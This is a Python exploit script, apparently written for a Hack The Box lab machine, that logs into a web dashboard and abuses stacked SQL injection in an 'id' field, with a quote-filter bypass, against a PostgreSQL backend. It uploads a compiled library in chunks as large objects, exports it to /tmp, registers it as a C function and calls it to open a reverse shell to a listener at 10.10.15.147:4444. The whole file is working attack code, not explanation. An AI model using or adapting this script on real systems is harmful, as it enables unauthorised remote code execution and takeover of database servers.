#!/usr/bin/python3

import requests
import random
import string
from urllib.parse import quote_plus
import math

# Parameters for call to rev_shell
LHOST = "10.10.15.147"
LPORT = 4444
username = 'admin'
password = 'culo'
URL = 'http://10.129.190.181:8080'

# Generate a random string
def randomString(N):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=N))

# Inject a query
def sqli(q, s):
    # Use an SQL injection to run the query `q`
    # Bypass Filter
    q = q.replace('\'', '$$')
    
    param_payload = {
        'title': 'Hackthebox',
        'username': 'admin',
        'password': 'culo',
#        'id': quote_plus(q)
        'id': '1' + q
    }

    r = s.post(URL + '/dashboard/edit', data = param_payload)
    if '<span>Logged in as <b>Admin, Admin (admin)</b></span>' in str(r.content):
        print('Request is successfull!----------------------------------------------')

    #return "Password edited!" in r.text

#create a session object and auth
session = requests.Session() 
r = session.get(URL)
if r.status_code == 200:
    print(f'Connected to {URL}')

#authenticate
login_pass = {'username': username, 
              'password': password
              }

r = session.post(URL + '/login', data=login_pass)
print(r.status_code)
if '<span>Logged in as <b>Admin, Admin (admin)</b></span>' in str(r.content):
    #print("Cookies after authentication: ", session.cookies)
    print('Authenticated!')

#assert sqli("1", session)

#Read the compiled extension
with open("pg_rev_shell.so","rb") as f:
    raw = f.read()

# Create a large object
loid = random.randint(50000,60000)
sqli(f";SELECT lo_create({loid});", session)
print(f"[*] Created large object with ID: {loid}")

# Upload pg_rev_shell.so to large object
for pageno in range(math.ceil(len(raw)/2048)):
    page = raw[pageno*2048:pageno*2048+2048]
    print(f"[*] Uploading Page: {pageno}, Length: {len(page)}, Offset: {pageno*2048}")
    #sqli(f"1;INSERT INTO pg_largeobject (loid, pageno, data) VALUES ({loid}, {pageno}, decode('{page.hex()}','hex'));")
    sqli(f";SELECT lo_put({loid}, {pageno*2048}, decode('{page.hex()}','hex'));", session)

# Write large object to file and run reverse shell
query  = f";SELECT lo_export({loid}, '/tmp/pg_rev_shell.so');"
query += f"SELECT lo_unlink({loid});"
query += "DROP FUNCTION IF EXISTS rev_shell;"
query += "CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;"
query += f"SELECT rev_shell('{LHOST}', {LPORT});"
print(f"[*] Writing pg_rev_shell.so to disk and triggering reverse shell (LHOST: {LHOST}, LPORT: {LPORT})")
sqli(query, session)